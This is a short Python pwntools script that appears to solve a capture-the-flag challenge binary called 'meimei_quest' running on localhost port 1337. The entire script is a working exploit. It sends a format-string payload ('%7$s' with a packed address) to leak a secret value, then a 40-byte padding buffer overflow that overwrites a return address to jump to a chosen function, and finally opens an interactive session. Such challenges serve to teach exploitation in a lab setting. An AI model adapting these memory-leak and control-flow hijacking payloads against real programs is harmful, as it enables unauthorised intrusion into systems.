#!/usr/bin/env python3

from pwn import *

context.log_level = 'error'
context.binary = elf = ELF('../src/build/meimei_quest')

HOST = "127.0.0.1"
PORT = 1337

if args.REMOTE:
    io = remote(HOST, PORT)
else:
    io = gdb.debug(elf.path, gdbscript=gs, cwd="../src/") if args.GDB else process(cwd="../src")

context.log_level = 'info'

io.recvuntil(b'0x')

target = int(io.recvuntil(b'.')[:-1], 16)
info("bao bao number @ " + hex(target))

payload = b'%7$s' + b' '*4 + p64(target)
io.sendlineafter(b'> ', payload)
io.recvuntil(b' : ')

number = io.recv(14)
io.sendlineafter(b'> ', number)

io.recvuntil(b'jump to ')
target = int(io.recvuntil(b',')[:-1], 16)
info("step3 @ " + hex(target))
payload = b'A'*40 + p64(target)

io.sendlineafter(b'> ', payload)
io.interactive()
